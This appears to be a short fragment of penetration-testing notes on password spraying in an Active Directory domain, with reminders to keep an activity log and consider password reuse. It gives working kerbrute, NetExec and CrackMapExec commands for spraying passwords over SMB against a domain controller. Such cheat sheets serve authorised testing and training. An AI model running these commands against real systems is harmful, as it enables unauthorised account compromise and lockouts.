...
---
Keep a log of activities, including, but not limited to:
...
> [!Note]
> 
> Consider password re-use or common password formats across accounts.
> 
...
# Using kerbrute
$ kerbrute passwordspray users.txt <PASSWORD> --dc <IP/FQDN> -d <DOMAIN>

# Using nxc
$ nxc smb 172.16.5.5 -u valid_users.txt -p $pass | grep +
...
$ crackmapexec smb 172.16.5.5 -u $username -p $password
```
